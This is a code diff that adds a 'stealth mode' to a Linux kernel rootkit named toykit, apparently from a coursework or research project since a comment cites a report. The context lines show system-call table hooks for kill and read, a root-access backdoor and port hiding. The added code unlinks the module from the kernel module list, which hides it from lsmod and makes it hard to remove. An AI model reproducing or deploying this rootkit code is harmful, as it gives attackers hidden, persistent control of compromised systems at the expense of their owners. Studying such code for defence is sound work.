@@ -22,6 +22,7 @@
 
 // STEALTH MODE 
 // rootkit is invisible and unremovable
+// comment out STEALTH_MODE to turn off
 // EGASU
 
 // for root-access backdoor
@@ -39,6 +40,9 @@
 
 // for port hiding
 #define HIDE_PORT "04D2" // 1234 in hex
+
+// for hiding from lsmod
+#define STEALTH_MODE 1 // comment out if you want to remove toykit
 
 // for writing to sys_call_table
 // CITATION [6] from report
@@ -335,6 +339,10 @@ asmlinkage long hacked_read(unsigned int fd, char __user *buf,
 }
 
 int rootkit_init(void) {
+#ifdef STEALTH_MODE
+	struct module *self;
+#endif
+
 	GPF_DISABLE; // make the sys_call_table_readable
 	orig_kill = (kill_ptr)sys_call_table[__NR_kill]; // hooking
 	sys_call_table[__NR_kill] = (unsigned long) hacked_kill;
@@ -348,6 +356,14 @@ int rootkit_init(void) {
 	orig_read = (read_ptr)sys_call_table[__NR_read];
 	sys_call_table[__NR_read] = (unsigned long) hacked_read;
 	GPF_ENABLE;
+
+#ifdef STEALTH_MODE
+	// hide from lsmod, impossible to remove
+	mutex_lock(&module_mutex);
+	if ((self = find_module("toykit")))
+		list_del(&self->list);
+	mutex_unlock(&module_mutex);
+#endif
 
 	printk(KERN_INFO "Loading rootkit\n");
     	return 0;
